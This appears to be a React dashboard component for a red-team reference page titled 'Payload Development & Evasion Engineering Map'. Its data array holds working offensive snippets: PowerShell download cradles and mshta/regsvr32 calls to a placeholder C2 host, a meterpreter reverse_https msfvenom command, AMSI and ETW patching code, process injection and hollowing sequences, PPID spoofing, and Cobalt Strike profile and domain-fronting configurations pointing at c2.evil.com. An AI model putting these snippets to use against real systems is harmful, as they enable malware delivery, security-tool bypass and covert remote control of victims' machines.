import { Box, Flex, Text, SimpleGrid } from '@chakra-ui/react';

const SECTIONS = [
  {
    id: 'payload-formats',
    label: 'Payload Formats & Containers',
    color: '#FC8181',
    icon: '📦',
    description: 'Common payload delivery containers and formats',
    items: [
      {
        title: 'Executable Formats',
        detail: 'PE (.exe, .dll), .NET assemblies, shellcode blobs. Choose format based on execution method and target environment.',
        cmd: '# Shellcode → PE (Donut)\npython3 donut.py -f 1 -a 2 -o payload.bin beacon.exe\n# .NET → shellcode\nDonut.exe -i Assembly.exe -o shellcode.bin -a 2 -f 1',
      },
      {
        title: 'Script-Based Payloads',
        detail: 'PowerShell, JScript, VBScript, HTA. Useful for phishing and initial access. Easy to obfuscate but heavily monitored.',
        cmd: '# PowerShell download cradle\npowershell -w hidden -nop -enc BASE64_CMD\n# HTA via mshta\nmshta http://c2/payload.hta\n# JScript via wscript\nwscript //E:jscript payload.js',
      },
      {
        title: 'Office Macros & Documents',
        detail: 'VBA macros in .docm/.xlsm, XLM 4.0 macros in .xls, DDE injection. Macro execution requires user interaction.',
        cmd: '# XLM 4.0 macro\n=EXEC("powershell -enc BASE64")\n=HALT()\n# VBA auto-execute\nSub AutoOpen()\n  Shell "cmd /c powershell -enc BASE64"\nEnd Sub',
      },
      {
        title: 'Archive & Container Smuggling',
        detail: 'ISO, VHD, ZIP containers bypass Mark-of-the-Web (MotW). Files inside ISOs/VHDs do not inherit Zone.Identifier.',
        cmd: '# Create ISO with payload\nmkisofs -o payload.iso payload_folder/\n# LNK inside ISO → executes without SmartScreen\n# HTML Smuggling (JS decode+download in browser)\n<script>var blob=new Blob([atob(b64)]);saveAs(blob,"payload.exe")</script>',
      },
    ],
  },
  {
    id: 'obfuscation',
    label: 'Obfuscation Techniques',
    color: '#9F7AEA',
    icon: '🎭',
    description: 'Evade static signature detection through code transformation',
    items: [
      {
        title: 'PowerShell Obfuscation',
        detail: 'String splitting, encoding, backtick insertion, aliasing, SecureString conversion. Use Invoke-Obfuscation or manual techniques.',
        cmd: "# Backtick insertion\niEx(Ne`w-Ob`ject Net.WebC`lient).Down`loadString('http://c2/ps1')\n# String concat\n$c='IEX';$c+=' (New-Object Net.WebClient).DownloadString(\"http://c2/ps1\")';IEX $c\n# Invoke-Obfuscation\nInvoke-Obfuscation -ScriptBlock {IEX(New-Object Net.WebClient).DownloadString('...')} -Command 'TOKEN\\ALL\\1'",
      },
      {
        title: 'Binary Obfuscation',
        detail: 'XOR / AES encryption of shellcode, custom decryption stubs, PE header stomping, import table obfuscation.',
        cmd: '# XOR encode shellcode (Python)\nkey = 0x41\nencoded = bytes([b ^ key for b in shellcode])\n# AES encrypt with msfvenom\nmsfvenom -p windows/x64/meterpreter/reverse_https LHOST=c2 LPORT=443 -e x64/zutto_dekiru -i 10 -f raw -o enc.bin',
      },
      {
        title: 'Source-Level Obfuscation',
        detail: 'Rename functions/variables, insert dead code, split strings, use uncommon APIs, rewrite logic flow.',
        cmd: '# ConfuserEx (.NET)\nConfuserEx.CLI.exe -n project.crproj\n# Scarecrow (Go shellcode loader)\nScarecrow -I payload.bin -Loader binary -domain microsoft.com -O loader.exe',
      },
    ],
  },
  {
    id: 'amsi-etw',
    label: 'AMSI & ETW Bypass',
    color: '#4FD1C5',
    icon: '🛡️',
    description: 'Disable or bypass Windows telemetry and scan interfaces',
    items: [
      {
        title: 'AMSI Bypass (PowerShell)',
        detail: 'Patch amsiInitFailed via reflection to prevent AmsiScanBuffer from running. Works in the current PS runspace.',
        cmd: "# Reflection patch (classic)\n[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\n# Force error via corrupt context\n$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')\n$b=$a.GetField('amsiContext','NonPublic,Static')\n$c=$b.GetValue($null)\n[Runtime.InteropServices.Marshal]::WriteByte($c,0x0)",
      },
      {
        title: 'AMSI Bypass (Native / C#)',
        detail: 'Patch AmsiScanBuffer in amsi.dll with a ret/xor patch using VirtualProtect + WriteProcessMemory.',
        cmd: '// C# patch\nvar lib = LoadLibrary("amsi.dll");\nvar addr = GetProcAddress(lib, "AmsiScanBuffer");\nVirtualProtect(addr, 5, 0x40, out _);\nbyte[] patch = { 0x31, 0xC0, 0xC3 }; // xor eax,eax; ret\nMarshal.Copy(patch, 0, addr, patch.Length);',
      },
      {
        title: 'ETW Patching',
        detail: 'Patch EtwEventWrite in ntdll.dll to suppress event tracing. Prevents Sysmon and other ETW consumers from receiving events.',
        cmd: '// Patch EtwEventWrite → ret 0\nvar ntdll = GetModuleHandle("ntdll.dll");\nvar etw = GetProcAddress(ntdll, "EtwEventWrite");\nVirtualProtect(etw, 4, 0x40, out _);\nbyte[] patch = { 0xC2, 0x14, 0x00, 0x00 }; // ret 0x14\nMarshal.Copy(patch, 0, etw, patch.Length);',
      },
    ],
  },
  {
    id: 'injection',
    label: 'Process Injection Techniques',
    color: '#68D391',
    icon: '💉',
    description: 'Inject shellcode or code into remote processes to evade EDR',
    items: [
      {
        title: 'Classic Shellcode Injection',
        detail: 'OpenProcess → VirtualAllocEx → WriteProcessMemory → CreateRemoteThread. Heavily monitored but baseline technique.',
        cmd: 'IntPtr hProc = OpenProcess(PROCESS_ALL_ACCESS, false, pid);\nIntPtr addr = VirtualAllocEx(hProc, IntPtr.Zero, (uint)sc.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);\nWriteProcessMemory(hProc, addr, sc, (uint)sc.Length, out _);\nCreateRemoteThread(hProc, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, out _);',
      },
      {
        title: 'Process Hollowing',
        detail: 'Spawn a suspended process, unmap its image, write malicious PE, resume. Inherits the legitimate process identity.',
        cmd: '# Create suspended\nCreateProcess(target, null, null, null, false, CREATE_SUSPENDED, null, null, si, pi);\n# Unmap + rewrite\nNtUnmapViewOfSection(pi.hProcess, baseAddr);\nVirtualAllocEx(pi.hProcess, baseAddr, imageSize, ...);\nWriteProcessMemory(...);\nSetThreadContext + ResumeThread;',
      },
      {
        title: 'Early-Bird APC Injection',
        detail: 'Queue an APC to the main thread of a newly-created suspended process before it executes any code. Evades many userland hooks.',
        cmd: 'CreateProcess(..., CREATE_SUSPENDED, ..., si, pi);\nIntPtr addr = VirtualAllocEx(pi.hProcess, ...);\nWriteProcessMemory(pi.hProcess, addr, shellcode, ...);\nVirtualProtectEx(pi.hProcess, addr, ..., PAGE_EXECUTE_READ, ...);\nQueueUserAPC(addr, pi.hThread, IntPtr.Zero);\nResumeThread(pi.hThread);',
      },
      {
        title: 'Direct Syscalls (SysWhispers)',
        detail: 'Bypass userland hooks by calling NT syscalls directly via inline ASM or a trampoline, bypassing ntdll.dll instrumentation.',
        cmd: '# SysWhispers3 generates direct syscall stubs\npython3 SysWhispers3.py --preset common -o syscalls\n# Use generated NtAllocateVirtualMemory, NtWriteVirtualMemory,\n# NtProtectVirtualMemory, NtCreateThreadEx directly',
      },
    ],
  },
  {
    id: 'av-edr-evasion',
    label: 'AV / EDR Evasion',
    color: '#F6AD55',
    icon: '👻',
    description: 'Techniques to evade endpoint detection and response tools',
    items: [
      {
        title: 'Sleep & Jitter',
        detail: 'Randomise beacon sleep intervals and add jitter to prevent timing-based behavioral detection.',
        cmd: '# Cobalt Strike profile\nset sleeptime "60000";\nset jitter "30";\n# Manual jitter (PowerShell)\n$sleep = Get-Random -Min 45000 -Max 75000\nStart-Sleep -Milliseconds $sleep',
      },
      {
        title: 'Stomping & Masquerading',
        detail: 'Overwrite PE headers after loading, spoof parent process (PPID spoofing), masquerade thread start address as legitimate module.',
        cmd: '// PPID spoofing — spawn as child of explorer.exe\nvar si = new STARTUPINFOEX();\nvar attrList = ...; // InitializeProcThreadAttributeList\nUpdateProcThreadAttribute(attrList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, hExplorer, ...);\nCreateProcess(..., EXTENDED_STARTUPINFO_PRESENT, ..., si, pi);',
      },
      {
        title: 'LOLBins Execution',
        detail: 'Use signed Windows binaries to execute arbitrary code, bypass application whitelisting (AppLocker/WDAC).',
        cmd: '# mshta\nmshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""powershell -enc BASE64"",0,True")\n# certutil decode\ncertutil -decode encoded.b64 payload.exe\n# regsvr32 (squiblydoo)\nregsvr32 /s /n /u /i:http://c2/file.sct scrobj.dll\n# wmic\nwmic process call create "powershell -enc BASE64"',
      },
      {
        title: 'Payload Testing',
        detail: 'Test payloads against AV/EDR before deployment using offline checkers. Never upload to VirusTotal.',
        cmd: '# ThreatCheck — find detected bytes\nThreatCheck.exe -f payload.exe -e AMSI\nThreatCheck.exe -f payload.exe -e Defender\n# DefenderCheck\nDefenderCheck.exe payload.exe\n# Find exact flagged offset with hexeditor / re-encode that region',
      },
    ],
  },
  {
    id: 'c2-profiles',
    label: 'C2 Malleable Profiles & Infrastructure',
    color: '#F687B3',
    icon: '📡',
    description: 'Configure C2 to blend into legitimate traffic',
    items: [
      {
        title: 'HTTP/S Malleable Profiles',
        detail: 'Shape C2 traffic to mimic legitimate software (Microsoft updates, CDNs, analytics). Modify headers, URIs, cookies, User-Agent.',
        cmd: '# Cobalt Strike profile snippet\nset useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";\nhttp-get {\n  set uri "/search?q=update&hl=en";\n  client { header "Host" "www.google.com"; }\n  server { header "Content-Type" "text/html"; }\n}',
      },
      {
        title: 'Domain Fronting',
        detail: 'Route C2 traffic through a CDN (Cloudflare, AWS CloudFront) using a trusted front domain. SNI ≠ Host header.',
        cmd: '# The TLS SNI → CDN edge domain (whitelisted)\n# HTTP Host header → actual C2 backend\ncurl -H "Host: c2.evil.com" https://trusted-cdn-domain.com/beacon\n# Havoc / Cobalt Strike CDN redirector config',
      },
      {
        title: 'Redirectors',
        detail: 'Apache/Nginx reverse proxy as a buffer between victim and teamserver. Filter by User-Agent, URI, IP range.',
        cmd: '# Apache mod_rewrite redirector\nRewriteEngine On\nRewriteCond %{HTTP_USER_AGENT} "Mozilla/5.0.*"\nRewriteRule ^/search(.*)$ http://TEAMSERVER:80/search$1 [P]\nRewriteRule .* /404.html [L]',
      },
    ],
  },
];

const ItemCard = ({ item, color }) => (
  <Box
    bg="rgba(0,0,0,0.2)" border={`1px solid ${color}20`}
    borderRadius="10px" p={3} mb={3}
  >
    <Text fontSize="12px" fontWeight="bold" color="var(--dash-text-primary)" mb={1}>
      {item.title}
    </Text>
    <Text fontSize="11px" color="var(--dash-text-secondary)" mb={2} lineHeight="tall">
      {item.detail}
    </Text>
    <Box bg="rgba(0,0,0,0.4)" borderRadius="7px" p={2.5}
      border="1px solid rgba(255,255,255,0.05)">
      <Text fontFamily="mono" fontSize="10px" color="#a5f3fc" whiteSpace="pre-wrap" lineHeight="tall">
        {item.cmd}
      </Text>
    </Box>
  </Box>
);

const SectionCard = ({ section }) => (
  <Box
    bg="var(--dash-card-bg)" border="1px solid var(--dash-card-border)"
    borderRadius="12px" overflow="hidden"
  >
    <Box h="3px" bg={section.color} />
    <Box p={4}>
      <Flex align="center" gap={2} mb={1}>
        <Text fontSize="15px">{section.icon}</Text>
        <Text fontSize="13px" fontWeight="bold" color="var(--dash-text-primary)">
          {section.label}
        </Text>
      </Flex>
      <Text fontSize="11px" color="var(--dash-text-muted)" mb={4}>{section.description}</Text>
      {section.items.map((item, i) => <ItemCard key={i} item={item} color={section.color} />)}
    </Box>
  </Box>
);

const TOOLS = [
  ['Donut', '#FC8181'], ['Scarecrow', '#9F7AEA'], ['SysWhispers3', '#4FD1C5'],
  ['Invoke-Obfuscation', '#F6AD55'], ['ConfuserEx', '#9F7AEA'], ['ThreatCheck', '#68D391'],
  ['Cobalt Strike', '#F687B3'], ['Havoc C2', '#ECC94B'], ['Sliver', '#76E4F7'],
  ['msfvenom', '#FC8181'], ['Donut', '#FBD38D'], ['pe_to_shellcode', '#68D391'],
];

const PayloadMapView = () => (
  <Box pb={8}>
    <Box mb={6}>
      <Text fontSize="2xl" fontWeight="bold" color="var(--dash-text-primary)">
        Payload Development <Text as="span" color="red.400">& Evasion Engineering Map</Text>
      </Text>
      <Text fontSize="12px" color="var(--dash-text-secondary)" mt={1}>
        Payload formats, obfuscation, AMSI/ETW bypass, process injection, AV/EDR evasion & C2 infrastructure
      </Text>
    </Box>

    {/* Evasion layer overview */}
    <Box
      bg="var(--dash-card-bg)" border="1px solid var(--dash-card-border)"
      borderRadius="12px" p={4} mb={6}
    >
      <Text fontSize="9px" color="var(--dash-text-muted)" textTransform="uppercase"
        letterSpacing="wider" mb={3}>Evasion Layers</Text>
      <Flex gap={2} flexWrap="wrap" align="center">
        {[
          { label: 'Payload Format', color: '#FC8181' },
          { label: '→', color: '#555' },
          { label: 'Obfuscation', color: '#9F7AEA' },
          { label: '→', color: '#555' },
          { label: 'AMSI/ETW Bypass', color: '#4FD1C5' },
          { label: '→', color: '#555' },
          { label: 'Injection', color: '#68D391' },
          { label: '→', color: '#555' },
          { label: 'EDR Evasion', color: '#F6AD55' },
          { label: '→', color: '#555' },
          { label: 'C2 Comms', color: '#F687B3' },
        ].map((item, i) =>
          item.label === '→'
            ? <Text key={i} fontSize="14px" color="var(--dash-text-muted)">→</Text>
            : <Box key={i} px={3} py="4px" borderRadius="6px"
                bg={`${item.color}18`} border={`1px solid ${item.color}35`}>
                <Text fontSize="10px" fontWeight="bold" color={item.color}>{item.label}</Text>
              </Box>
        )}
      </Flex>
    </Box>

    {/* Core toolset */}
    <Box
      bg="var(--dash-card-bg)" border="1px solid var(--dash-card-border)"
      borderRadius="12px" p={4} mb={6}
    >
      <Text fontSize="9px" color="var(--dash-text-muted)" textTransform="uppercase"
        letterSpacing="wider" mb={3}>Core Toolset</Text>
      <Flex gap={2} flexWrap="wrap">
        {TOOLS.map(([tool, color], i) => (
          <Box key={i} px="8px" py="2px" borderRadius="5px" fontSize="10px" fontWeight="semibold"
            bg={`${color}14`} border={`1px solid ${color}30`} color={color}>
            {tool}
          </Box>
        ))}
      </Flex>
    </Box>

    <SimpleGrid columns={{ base: 1, lg: 2 }} gap={4}>
      {SECTIONS.map((s) => <SectionCard key={s.id} section={s} />)}
    </SimpleGrid>
  </Box>
);

export default PayloadMapView;
